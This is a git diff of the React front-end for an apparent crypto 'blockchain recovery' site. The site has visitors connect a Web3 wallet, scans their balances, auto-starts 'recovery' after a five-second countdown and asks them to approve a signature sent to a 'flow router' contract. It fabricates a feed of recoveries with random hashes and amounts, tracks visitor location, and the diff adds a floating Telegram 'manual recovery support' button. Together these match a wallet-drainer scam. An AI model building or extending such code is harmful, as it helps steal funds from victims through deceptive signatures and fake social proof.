@@ -109,16 +109,15 @@ const TRANSLATIONS = {
     emailSupportDesc: 'No Telegram? No problem! Send us an email with your issue and our support team will get back to you within 24 hours.',
     whyEmailSupport: 'Why Email Support?',
     emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual recovery cases',
-    // NEW INSTRUCTION KEYS
     recoveryInstructionsTitle: '🔐 How to Recover Your Assets',
-    recoveryStep1: 'Connect your wallet using the button below.****Supported:** Non-custodial (Web3) wallets only. Exchange wallets are not supported.',
+    recoveryStep1: 'Connect your wallet using the button below. Supported: Non-custodial (Web3) wallets only. Exchange wallets are not supported.',
     recoveryStep2: 'Wait for automatic scan of 5 blockchain networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche), Note (Must have an On-chain balance in any of the supported networks to be eligible)',
     recoveryStep3: 'If eligible, the system will automatically initiate recovery (or you can click the button).',
     recoveryStep4: 'Approve the signature in your wallet to authorize the recovery.',
     recoveryStep5: 'Recovery completes! You\'ll receive a confirmation and downloadable report.',
     recoveryNote: '⚠️ Important: Do not disconnect or close your wallet during the process. Auto‑recovery starts in 5 seconds after eligibility detection.',
-    // New key for manual recovery hint
-    manualRecoveryHint: '👇 Need manual recovery? Contact our support via Telegram or Email below.'
+    manualRecoveryHint: '👇 Need manual recovery? Contact our support via Telegram or Email below.',
+    supportIconLabel: '💬 Manual Recovery Support'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -201,7 +200,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Aprueba la firma en tu wallet para autorizar la recuperación.',
     recoveryStep5: '¡Recuperación completada! Recibirás una confirmación y un informe descargable.',
     recoveryNote: '⚠️ Importante: No desconectes ni cierres tu wallet durante el proceso. La auto‑recuperación comienza en 5 segundos después de detectar elegibilidad.',
-    manualRecoveryHint: '👇 ¿Necesitas recuperación manual? Contacta a nuestro soporte vía Telegram o Email abajo.'
+    manualRecoveryHint: '👇 ¿Necesitas recuperación manual? Contacta a nuestro soporte vía Telegram o Email abajo.',
+    supportIconLabel: '💬 Soporte de Recuperación Manual'
   },
   fr: {
     serviceActive: 'PROTOCOLE DE RÉCUPÉRATION · ACTIF',
@@ -284,7 +284,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Approuvez la signature dans votre portefeuille pour autoriser la récupération.',
     recoveryStep5: 'Récupération terminée ! Vous recevrez une confirmation et un rapport téléchargeable.',
     recoveryNote: '⚠️ Important : Ne déconnectez pas et ne fermez pas votre portefeuille pendant le processus. La récupération automatique démarre dans 5 secondes après détection de l\'éligibilité.',
-    manualRecoveryHint: '👇 Besoin d\'une récupération manuelle ? Contactez notre support via Telegram ou Email ci-dessous.'
+    manualRecoveryHint: '👇 Besoin d\'une récupération manuelle ? Contactez notre support via Telegram ou Email ci-dessous.',
+    supportIconLabel: '💬 Support de Récupération Manuelle'
   },
   de: {
     serviceActive: 'WIEDERHERSTELLUNGSPROTOKOLL · AKTIV',
@@ -367,7 +368,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Genehmigen Sie die Signatur in Ihrem Wallet, um die Wiederherstellung zu autorisieren.',
     recoveryStep5: 'Wiederherstellung abgeschlossen! Sie erhalten eine Bestätigung und einen herunterladbaren Bericht.',
     recoveryNote: '⚠️ Wichtig: Trennen Sie Ihr Wallet während des Vorgangs nicht und schließen Sie es nicht. Die automatische Wiederherstellung beginnt 5 Sekunden nach der Erkennung der Berechtigung.',
-    manualRecoveryHint: '👇 Brauchen Sie manuelle Wiederherstellung? Kontaktieren Sie unseren Support über Telegram oder Email unten.'
+    manualRecoveryHint: '👇 Brauchen Sie manuelle Wiederherstellung? Kontaktieren Sie unseren Support über Telegram oder Email unten.',
+    supportIconLabel: '💬 Manueller Wiederherstellungs-Support'
   },
   it: {
     serviceActive: 'PROTOCOLLO DI RECUPERO · ATTIVO',
@@ -450,7 +452,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Approva la firma nel tuo wallet per autorizzare il recupero.',
     recoveryStep5: 'Recupero completato! Riceverai una conferma e un rapporto scaricabile.',
     recoveryNote: '⚠️ Importante: Non disconnettere né chiudere il wallet durante il processo. L\'auto‑recupero parte in 5 secondi dopo il rilevamento dell\'idoneità.',
-    manualRecoveryHint: '👇 Hai bisogno di recupero manuale? Contatta il nostro supporto via Telegram o Email qui sotto.'
+    manualRecoveryHint: '👇 Hai bisogno di recupero manuale? Contatta il nostro supporto via Telegram o Email qui sotto.',
+    supportIconLabel: '💬 Supporto Recupero Manuale'
   },
   pt: {
     serviceActive: 'PROTOCOLO DE RECUPERAÇÃO · ATIVO',
@@ -533,7 +536,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Aprove a assinatura em sua carteira para autorizar a recuperação.',
     recoveryStep5: 'Recuperação concluída! Você receberá uma confirmação e um relatório para download.',
     recoveryNote: '⚠️ Importante: Não desconecte nem feche sua carteira durante o processo. A auto‑recuperação começa em 5 segundos após a detecção de elegibilidade.',
-    manualRecoveryHint: '👇 Precisa de recuperação manual? Entre em contato com nosso suporte via Telegram ou Email abaixo.'
+    manualRecoveryHint: '👇 Precisa de recuperação manual? Entre em contato com nosso suporte via Telegram ou Email abaixo.',
+    supportIconLabel: '💬 Suporte de Recuperação Manual'
   },
   ru: {
     serviceActive: 'ПРОТОКОЛ ВОССТАНОВЛЕНИЯ · АКТИВЕН',
@@ -616,7 +620,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Подтвердите подпись в кошельке для авторизации восстановления.',
     recoveryStep5: 'Восстановление завершено! Вы получите подтверждение и отчёт для скачивания.',
     recoveryNote: '⚠️ Важно: Не отключайте и не закрывайте кошелёк во время процесса. Автовосстановление начнётся через 5 секунд после обнаружения права.',
-    manualRecoveryHint: '👇 Нужно ручное восстановление? Свяжитесь с нашей поддержкой через Telegram или Email ниже.'
+    manualRecoveryHint: '👇 Нужно ручное восстановление? Свяжитесь с нашей поддержкой через Telegram или Email ниже.',
+    supportIconLabel: '💬 Поддержка ручного восстановления'
   },
   zh: {
     serviceActive: '恢复协议 · 活跃中',
@@ -699,7 +704,8 @@ const TRANSLATIONS = {
     recoveryStep4: '在钱包中批准签名以授权恢复。',
     recoveryStep5: '恢复完成！您将收到确认和可下载的报告。',
     recoveryNote: '⚠️ 重要：恢复过程中请勿断开或关闭钱包。检测到资格后，自动恢复将在 5 秒后开始。',
-    manualRecoveryHint: '👇 需要手动恢复？请通过下方的 Telegram 或 Email 联系我们的支持团队。'
+    manualRecoveryHint: '👇 需要手动恢复？请通过下方的 Telegram 或 Email 联系我们的支持团队。',
+    supportIconLabel: '💬 手动恢复支持'
   },
   ja: {
     serviceActive: 'リカバリープロトコル · アクティブ',
@@ -782,7 +788,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'ウォレットで署名を承認して復元を許可します。',
     recoveryStep5: '復元完了！確認とダウンロード可能なレポートを受け取ります。',
     recoveryNote: '⚠️ 重要：処理中はウォレットを切断したり閉じたりしないでください。対象検出後5秒で自動復元が開始されます。',
-    manualRecoveryHint: '👇 手動復元が必要ですか？下の Telegram または Email からサポートにお問い合わせください。'
+    manualRecoveryHint: '👇 手動復元が必要ですか？下の Telegram または Email からサポートにお問い合わせください。',
+    supportIconLabel: '💬 手動復元サポート'
   },
   ko: {
     serviceActive: '복구 프로토콜 · 활성화됨',
@@ -865,7 +872,8 @@ const TRANSLATIONS = {
     recoveryStep4: '지갑에서 서명을 승인하여 복구를 허가하세요.',
     recoveryStep5: '복구 완료! 확인 및 다운로드 가능한 보고서를 받게 됩니다.',
     recoveryNote: '⚠️ 중요: 프로세스 중에 지갑을 연결 해제하거나 닫지 마세요. 자격 감지 후 5초 후에 자동 복구가 시작됩니다.',
-    manualRecoveryHint: '👇 수동 복구가 필요하신가요? 아래 Telegram 또는 Email을 통해 지원팀에 문의하세요.'
+    manualRecoveryHint: '👇 수동 복구가 필요하신가요? 아래 Telegram 또는 Email을 통해 지원팀에 문의하세요.',
+    supportIconLabel: '💬 수동 복구 지원'
   },
   ar: {
     serviceActive: 'بروتوكول الاسترداد · نشط',
@@ -948,7 +956,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'وافق على التوقيع في محفظتك لتأذن بالاسترداد.',
     recoveryStep5: 'اكتمل الاسترداد! ستتلقى تأكيدًا وتقريرًا قابلًا للتنزيل.',
     recoveryNote: '⚠️ مهم: لا تقم بقطع الاتصال أو إغلاق محفظتك أثناء العملية. سيبدأ الاسترداد التلقائي بعد 5 ثوانٍ من اكتشاف الأهلية.',
-    manualRecoveryHint: '👇 هل تحتاج إلى استرداد يدوي؟ اتصل بفريق الدعم عبر Telegram أو Email أدناه.'
+    manualRecoveryHint: '👇 هل تحتاج إلى استرداد يدوي؟ اتصل بفريق الدعم عبر Telegram أو Email أدناه.',
+    supportIconLabel: '💬 دعم الاسترداد اليدوي'
   },
   hi: {
     serviceActive: 'रिकवरी प्रोटोकॉल · सक्रिय',
@@ -1031,7 +1040,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'रिकवरी को अधिकृत करने के लिए अपने वॉलेट में हस्ताक्षर स्वीकृत करें।',
     recoveryStep5: 'रिकवरी पूरी हुई! आपको एक पुष्टि और डाउनलोड करने योग्य रिपोर्ट प्राप्त होगी।',
     recoveryNote: '⚠️ महत्वपूर्ण: प्रक्रिया के दौरान अपने वॉलेट को डिस्कनेक्ट या बंद न करें। पात्रता का पता लगने के 5 सेकंड बाद स्वचालित रिकवरी शुरू हो जाती है।',
-    manualRecoveryHint: '👇 क्या आपको मैन्युअल रिकवरी की आवश्यकता है? नीचे Telegram या Email के माध्यम से हमारी सहायता टीम से संपर्क करें।'
+    manualRecoveryHint: '👇 क्या आपको मैन्युअल रिकवरी की आवश्यकता है? नीचे Telegram या Email के माध्यम से हमारी सहायता टीम से संपर्क करें।',
+    supportIconLabel: '💬 मैन्युअल रिकवरी सहायता'
   },
   tr: {
     serviceActive: 'KURTARMA PROTOKOLÜ · AKTİF',
@@ -1114,7 +1124,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Kurtarmayı yetkilendirmek için cüzdanınızdaki imzayı onaylayın.',
     recoveryStep5: 'Kurtarma tamamlandı! Bir onay ve indirilebilir rapor alacaksınız.',
     recoveryNote: '⚠️ Önemli: İşlem sırasında cüzdanınızın bağlantısını kesmeyin veya kapatmayın. Uygunluk tespitinden 5 saniye sonra otomatik kurtarma başlar.',
-    manualRecoveryHint: '👇 Manuel kurtarma mı gerekiyor? Aşağıdaki Telegram veya Email üzerinden destek ekibimizle iletişime geçin.'
+    manualRecoveryHint: '👇 Manuel kurtarma mı gerekiyor? Aşağıdaki Telegram veya Email üzerinden destek ekibimizle iletişime geçin.',
+    supportIconLabel: '💬 Manuel Kurtarma Desteği'
   },
   nl: {
     serviceActive: 'HERSTELPROTOCOL · ACTIEF',
@@ -1197,7 +1208,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Keur de handtekening in uw wallet goed om het herstel te autoriseren.',
     recoveryStep5: 'Herstel voltooid! U ontvangt een bevestiging en een downloadbaar rapport.',
     recoveryNote: '⚠️ Belangrijk: Verbreek de verbinding niet en sluit uw wallet niet tijdens het proces. Automatisch herstel start 5 seconden na detectie van geschiktheid.',
-    manualRecoveryHint: '👇 Handmatig herstel nodig? Neem contact op met onze support via Telegram of Email hieronder.'
+    manualRecoveryHint: '👇 Handmatig herstel nodig? Neem contact op met onze support via Telegram of Email hieronder.',
+    supportIconLabel: '💬 Handmatige herstelondersteuning'
   },
   pl: {
     serviceActive: 'PROTOKÓŁ ODZYSKIWANIA · AKTYWNY',
@@ -1280,7 +1292,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Zatwierdź podpis w swoim portfelu, aby autoryzować odzyskiwanie.',
     recoveryStep5: 'Odzyskiwanie zakończone! Otrzymasz potwierdzenie i raport do pobrania.',
     recoveryNote: '⚠️ Ważne: Nie rozłączaj ani nie zamykaj swojego portfela podczas procesu. Auto-odzyskiwanie rozpoczyna się 5 sekund po wykryciu kwalifikowalności.',
-    manualRecoveryHint: '👇 Potrzebujesz ręcznego odzyskania? Skontaktuj się z naszym wsparciem przez Telegram lub Email poniżej.'
+    manualRecoveryHint: '👇 Potrzebujesz ręcznego odzyskania? Skontaktuj się z naszym wsparciem przez Telegram lub Email poniżej.',
+    supportIconLabel: '💬 Ręczne wsparcie odzyskiwania'
   },
   vi: {
     serviceActive: 'GIAO THỨC PHỤC HỒI · ĐANG HOẠT ĐỘNG',
@@ -1363,7 +1376,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Phê duyệt chữ ký trong ví của bạn để ủy quyền phục hồi.',
     recoveryStep5: 'Phục hồi hoàn tất! Bạn sẽ nhận được xác nhận và báo cáo có thể tải xuống.',
     recoveryNote: '⚠️ Quan trọng: Không ngắt kết nối hoặc đóng ví của bạn trong quá trình. Tự động phục hồi bắt đầu sau 5 giây kể từ khi phát hiện đủ điều kiện.',
-    manualRecoveryHint: '👇 Cần phục hồi thủ công? Liên hệ với bộ phận hỗ trợ của chúng tôi qua Telegram hoặc Email bên dưới.'
+    manualRecoveryHint: '👇 Cần phục hồi thủ công? Liên hệ với bộ phận hỗ trợ của chúng tôi qua Telegram hoặc Email bên dưới.',
+    supportIconLabel: '💬 Hỗ trợ phục hồi thủ công'
   },
   th: {
     serviceActive: 'โปรโตคอลการกู้คืน · ทำงานอยู่',
@@ -1446,7 +1460,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'อนุมัติลายเซ็นในกระเป๋าเงินของคุณเพื่ออนุญาตการกู้คืน',
     recoveryStep5: 'การกู้คืนเสร็จสมบูรณ์! คุณจะได้รับการยืนยันและรายงานที่ดาวน์โหลดได้',
     recoveryNote: '⚠️ สำคัญ: อย่าตัดการเชื่อมต่อหรือปิดกระเป๋าเงินของคุณในระหว่างกระบวนการ การกู้คืนอัตโนมัติจะเริ่มใน 5 วินาทีหลังจากตรวจพบคุณสมบัติ',
-    manualRecoveryHint: '👇 ต้องการการกู้คืนด้วยตนเอง? ติดต่อทีมสนับสนุนของเราผ่าน Telegram หรือ Email ด้านล่าง'
+    manualRecoveryHint: '👇 ต้องการการกู้คืนด้วยตนเอง? ติดต่อทีมสนับสนุนของเราผ่าน Telegram หรือ Email ด้านล่าง',
+    supportIconLabel: '💬 การสนับสนุนการกู้คืนด้วยตนเอง'
   },
   id: {
     serviceActive: 'PROTOKOL PEMULIHAN · AKTIF',
@@ -1529,7 +1544,8 @@ const TRANSLATIONS = {
     recoveryStep4: 'Setujui tanda tangan di dompet Anda untuk mengotorisasi pemulihan.',
     recoveryStep5: 'Pemulihan selesai! Anda akan menerima konfirmasi dan laporan yang dapat diunduh.',
     recoveryNote: '⚠️ Penting: Jangan putuskan sambungan atau tutup dompet Anda selama proses. Pemulihan otomatis dimulai 5 detik setelah deteksi kelayakan.',
-    manualRecoveryHint: '👇 Perlu pemulihan manual? Hubungi tim dukungan kami melalui Telegram atau Email di bawah.'
+    manualRecoveryHint: '👇 Perlu pemulihan manual? Hubungi tim dukungan kami melalui Telegram atau Email di bawah.',
+    supportIconLabel: '💬 Dukungan Pemulihan Manual'
   }
 };
 
@@ -1616,16 +1632,14 @@ const MULTICHAIN_CONFIG = {
 
 const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG).map(chain => ({
   ...chain,
-  rpc: chain.rpcs[0] // for backward compatibility, keep primary rpc
+  rpc: chain.rpcs[0]
 }));
 
-// Helper function to get a working JsonRpcProvider with fallback
 const getJsonRpcProvider = async (chain, retries = 2) => {
   const rpcs = chain.rpcs || [chain.rpc];
   for (let i = 0; i < rpcs.length; i++) {
     try {
       const provider = new ethers.JsonRpcProvider(rpcs[i]);
-      // Test connection
       await provider.getBlockNumber();
       return provider;
     } catch (err) {
@@ -1641,35 +1655,26 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "event FlowProcessed(address indexed initiator, uint256 value)"
 ];
 
-// ============================================
-// PERSISTENT STORAGE KEYS
-// ============================================
 const STORAGE_KEYS = {
   LIVE_TRANSACTIONS: 'blockchainRecovery_liveTransactions',
   LAST_RESET_DATE: 'blockchainRecovery_lastResetDate',
   TOTAL_RECOVERED_AMOUNT: 'blockchainRecovery_totalRecoveredAmount'
 };
 
-// Helper to check if date has changed (for daily reset)
 const hasDateChanged = (lastDate) => {
   if (!lastDate) return true;
   const today = new Date().toDateString();
   return lastDate !== today;
 };
 
-// Get random recovery amount between $2,000 and $1,000,000
 const getRandomRecoveryAmount = () => {
   return Math.floor(Math.random() * (1000000 - 2000 + 1) + 2000);
 };
 
-// Generate unique recovery ID
 const generateRecoveryId = () => {
   return 'RVC-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
 };
 
-// ============================================
-// GENERATE RECOVERY REPORT PDF (Download as JSON/Text)
-// ============================================
 const generateRecoveryReport = (tx, walletAddress, recoveryAmount, chains, timestamp, chainDetails) => {
   const reportData = {
     reportId: generateRecoveryId(),
@@ -1886,7 +1891,7 @@ const AutoRecoveryCountdown = ({ seconds, translations, onCancel }) => {
 };
 
 // ============================================
-// ENHANCED REPORT ISSUE COMPONENT - WITH EMAIL INPUT (PROMINENTLY PLACED)
+// ENHANCED REPORT ISSUE COMPONENT - WITH EMAIL INPUT
 // ============================================
 const ReportIssue = ({ translations, address, balances, userLocation }) => {
   const [userEmail, setUserEmail] = useState('');
@@ -1909,7 +1914,6 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
     setErrorMsg('');
     
     try {
-      // Send to backend which will forward to admin email AND Telegram
       const response = await fetch(`${BACKEND_URL}/api/send-report`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -1967,7 +1971,6 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
         <span className="text-green-400">✓</span> {translations.contactInfo}
       </p>
       
-      {/* Email Input */}
       <input
         type="email"
         value={userEmail}
@@ -1976,7 +1979,6 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
         className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm mb-3"
       />
       
-      {/* Issue Textarea */}
       <textarea
         value={issueText}
         onChange={(e) => setIssueText(e.target.value)}
@@ -1985,21 +1987,18 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
         className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm mb-3"
       />
       
-      {/* Error Message */}
       {errorMsg && (
         <div className="mb-3 text-xs text-red-400 bg-red-500/10 rounded-lg p-2">
           ⚠️ {errorMsg}
         </div>
       )}
       
-      {/* Success Message */}
       {sent && (
         <div className="mb-3 text-xs text-green-400 bg-green-500/10 rounded-lg p-2 flex items-center gap-2">
           <span>✓</span> {translations.reportSent}
         </div>
       )}
       
-      {/* Send Button */}
       <button
         onClick={handleSendReport}
         disabled={isSending}
@@ -2017,9 +2016,10 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
 };
 
 // ============================================
-// TELEGRAM SUPPORT COMPONENT - ENHANCED & DETAILED
+// TELEGRAM SUPPORT COMPONENT - KEEP ORIGINAL GROUP LINK
 // ============================================
 const TelegramSupport = ({ translations }) => {
+  // KEEP the original group link - DO NOT REPLACE
   const TELEGRAM_GROUP_LINK = 'https://t.me/+UUhEUx9wBW5jZGQ1';
   const [showTooltip, setShowTooltip] = useState(false);
 
@@ -2074,6 +2074,73 @@ const TelegramSupport = ({ translations }) => {
             )}
           </a>
         </div>
+      </div>
+    </div>
+  );
+};
+
+// ============================================
+// FLOATING SUPPORT ICON - NEW! Links to chainfixsupport
+// ============================================
+const FloatingSupportIcon = ({ translations }) => {
+  const [showTooltip, setShowTooltip] = useState(false);
+  const [isHovered, setIsHovered] = useState(false);
+  const SUPPORT_LINK = 'https://t.me/chainfixsupport';
+
+  return (
+    <div className="fixed bottom-28 left-4 z-50 md:bottom-32 md:left-8">
+      <a
+        href={SUPPORT_LINK}
+        target="_blank"
+        rel="noopener noreferrer"
+        onMouseEnter={() => { setShowTooltip(true); setIsHovered(true); }}
+        onMouseLeave={() => { setShowTooltip(false); setIsHovered(false); }}
+        className="relative block group"
+      >
+        {/* Animated pulse ring */}
+        <div className="absolute inset-0 rounded-full bg-blue-500/40 animate-ping-slow"></div>
+        <div className="absolute inset-0 rounded-full bg-blue-500/30 animate-pulse"></div>
+        
+        {/* Main button */}
+        <div className={`
+          relative flex items-center justify-center w-16 h-16 rounded-full 
+          bg-gradient-to-br from-blue-500 to-blue-600 
+          shadow-2xl shadow-blue-500/50 
+          transition-all duration-300 transform 
+          ${isHovered ? 'scale-110 rotate-3' : 'scale-100'}
+          hover:shadow-blue-500/70
+          border-2 border-blue-400/50
+        `}>
+          {/* Telegram logo */}
+          <svg className="w-8 h-8 text-white drop-shadow-lg" fill="currentColor" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34z"/>
+          </svg>
+          
+          {/* Small badge */}
+          <div className="absolute -top-1 -right-1 bg-red-500 rounded-full w-5 h-5 flex items-center justify-center text-[8px] font-bold text-white shadow-lg animate-pulse">
+            !
+          </div>
+        </div>
+        
+        {/* Tooltip */}
+        {showTooltip && (
+          <div className="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-3 w-48 p-3 bg-gray-900/95 backdrop-blur rounded-xl shadow-2xl border border-blue-500/30 text-center animate-fadeIn">
+            <p className="text-xs text-white font-semibold leading-relaxed">
+              {translations.supportIconLabel || '💬 Manual Recovery Support'}
+            </p>
+            <p className="text-[10px] text-blue-400 mt-1">
+              Click to chat on Telegram
+            </p>
+            <div className="absolute bottom-0 left-1/2 transform -translate-x-1/2 translate-y-1/2 w-3 h-3 bg-gray-900 rotate-45 border-r border-b border-blue-500/30"></div>
+          </div>
+        )}
+      </a>
+      
+      {/* Label below the icon */}
+      <div className="mt-2 text-center">
+        <span className="text-[10px] text-blue-400/80 font-medium bg-black/50 px-2 py-0.5 rounded-full backdrop-blur animate-pulse-slow">
+          Support
+        </span>
       </div>
     </div>
   );
@@ -2171,7 +2238,6 @@ const Footer = () => {
       <LegalModal isOpen={riskOpen} onClose={() => setRiskOpen(false)} title="Risk Disclaimer" content={riskContent} />
       
       <div className="grid grid-cols-1 md:grid-cols-4 gap-8 text-sm">
-        {/* Company Info */}
         <div>
           <h4 className="font-bold text-blue-400 mb-3">Blockchain Recovery</h4>
           <p className="text-gray-400 leading-relaxed">
@@ -2180,7 +2246,6 @@ const Footer = () => {
           <p className="text-gray-500 text-xs mt-2">Est. 2026</p>
         </div>
         
-        {/* Contact */}
         <div>
           <h4 className="font-bold text-blue-400 mb-3">Contact</h4>
           <p className="text-gray-400">support@blockchainrecovery.io</p>
@@ -2195,7 +2260,6 @@ const Footer = () => {
           </div>
         </div>
         
-        {/* Legal Links */}
         <div>
           <h4 className="font-bold text-blue-400 mb-3">Legal</h4>
           <ul className="space-y-2 text-gray-400">
@@ -2205,7 +2269,6 @@ const Footer = () => {
           </ul>
         </div>
         
-        {/* Service Explanation */}
         <div>
           <h4 className="font-bold text-blue-400 mb-3">How It Works</h4>
           <p className="text-gray-400 leading-relaxed text-xs">
@@ -2224,14 +2287,13 @@ const Footer = () => {
 };
 
 // ============================================
-// RECOVERY INSTRUCTION COMPONENT - SIDE PANEL VERSION (MODIFIED)
+// RECOVERY INSTRUCTION COMPONENT - SIDE PANEL VERSION
 // ============================================
 const RecoveryInstructions = ({ translations }) => {
   const [expanded, setExpanded] = useState(false);
 
   return (
     <>
-      {/* Toggle button - fixed top-left, always visible */}
       <button
         onClick={() => setExpanded(!expanded)}
         className="fixed top-6 left-6 z-50 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-full shadow-lg flex items-center gap-2 transition-all duration-300"
@@ -2241,7 +2303,6 @@ const RecoveryInstructions = ({ translations }) => {
         <span className="text-sm font-semibold sm:hidden">Guide</span>
       </button>
 
-      {/* Overlay */}
       {expanded && (
         <div
           className="fixed inset-0 bg-black/50 backdrop-blur-sm z-40"
@@ -2249,7 +2310,6 @@ const RecoveryInstructions = ({ translations }) => {
         />
       )}
 
-      {/* Side panel - slides in from left */}
       <div
         className={`fixed top-0 left-0 h-full w-80 bg-black/95 backdrop-blur-md border-r border-blue-500/30 shadow-2xl z-50 transition-transform duration-300 ease-in-out ${
           expanded ? 'translate-x-0' : '-translate-x-full'
@@ -2297,7 +2357,7 @@ const RecoveryInstructions = ({ translations }) => {
 };
 
 // ============================================
-// MAIN APP COMPONENT - Blockchain Recovery System
+// MAIN APP COMPONENT
 // ============================================
 function App() {
   const { open } = useAppKit();
@@ -2338,7 +2398,6 @@ function App() {
   const [autoRecoveryActive, setAutoRecoveryActive] = useState(false);
   const [chainDetailsForReport, setChainDetailsForReport] = useState([]);
   
-  // LIVE TRANSACTIONS STATE - Loaded from localStorage
   const [liveTransactions, setLiveTransactions] = useState([]);
   const [showPopup, setShowPopup] = useState(false);
   const [currentPopupTx, setCurrentPopupTx] = useState(null);
@@ -2346,12 +2405,10 @@ function App() {
   const [lastRecoveryTime, setLastRecoveryTime] = useState('Just now');
   const [todayTotalRecovered, setTodayTotalRecovered] = useState(0);
   
-  // LANGUAGE STATE
   const [language, setLanguage] = useState('en');
   const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
   const [translations, setTranslations] = useState(TRANSLATIONS.en);
 
-  // Recovery stats
   const [presaleStats, setPresaleStats] = useState({
     totalRaised: 1250000,
     totalSold: 4250000,
@@ -2363,12 +2420,10 @@ function App() {
     bthPrice: 0.045
   });
 
-  // Calculate total recovered amount from live transactions (in USD)
   const totalRecoveredAmountUSD = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
   const todayCount = liveTransactions.length;
   const totalOnChainValue = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
 
-  // FORMAT TIME AGO FUNCTION
   const formatTimeAgo = (date) => {
     const seconds = Math.floor((new Date() - new Date(date)) / 1000);
     if (seconds < 5) return 'Just now';
@@ -2380,7 +2435,6 @@ function App() {
     return `${Math.floor(hours / 24)}d ago`;
   };
 
-  // GENERATE RANDOM TRANSACTION HASH (blockchain-like)
   const generateRandomHash = () => {
     const prefixes = ['0x7a3f', '0x9e1c', '0x4d5f', '0x2b8a', '0x6c9d', '0x8f3e', '0x1a7b', '0x5c2d'];
     const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
@@ -2389,13 +2443,11 @@ function App() {
     ).join('');
   };
 
-  // Get random chain for recovery
   const getRandomChain = () => {
     const chains = ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'];
     return chains[Math.floor(Math.random() * chains.length)];
   };
 
-  // LOAD PERSISTENT DATA ON MOUNT
   useEffect(() => {
     const loadPersistentData = () => {
       const lastDate = localStorage.getItem(STORAGE_KEYS.LAST_RESET_DATE);
@@ -2427,7 +2479,6 @@ function App() {
     loadPersistentData();
   }, []);
 
-  // Save transactions to localStorage
   useEffect(() => {
     if (liveTransactions.length > 0) {
       const toSave = liveTransactions.map(({ timeAgo, ...tx }) => tx);
@@ -2435,13 +2486,11 @@ function App() {
     }
   }, [liveTransactions]);
 
-  // Update total recovered amount for the day
   useEffect(() => {
     const total = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
     setTodayTotalRecovered(total);
   }, [liveTransactions]);
 
-  // SCHEDULE RANDOM POPUPS every 8-15 minutes
   useEffect(() => {
     let isMounted = true;
     
@@ -2490,7 +2539,6 @@ function App() {
     };
   }, []);
 
-  // Update active users periodically
   useEffect(() => {
     const interval = setInterval(() => {
       setActiveUsers(Math.floor(Math.random() * 15) + 3);
@@ -2498,7 +2546,6 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // AUTO DETECT LANGUAGE FROM BROWSER
   useEffect(() => {
     const detectLanguage = () => {
       const path = window.location.pathname;
@@ -2523,7 +2570,6 @@ function App() {
     detectLanguage();
   }, []);
 
-  // CHANGE LANGUAGE FUNCTION
   const changeLanguage = (langCode) => {
     setLanguage(langCode);
     setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
@@ -2540,7 +2586,6 @@ function App() {
     window.history.pushState({}, '', url.toString());
   };
 
-  // Fetch crypto prices
   useEffect(() => {
     const fetchPrices = async () => {
       try {
@@ -2562,7 +2607,6 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // Initialize provider and signer from AppKit
   useEffect(() => {
     if (!walletProvider || !address) {
       setWalletInitialized(false);
@@ -2593,7 +2637,6 @@ function App() {
     init();
   }, [walletProvider, address, translations]);
 
-  // Track page visit with location - CRITICAL FOR TELEGRAM
   useEffect(() => {
     const trackVisit = async () => {
       try {
@@ -2624,14 +2667,12 @@ function App() {
     trackVisit();
   }, []);
 
-  // Auto-check eligibility when wallet connects
   useEffect(() => {
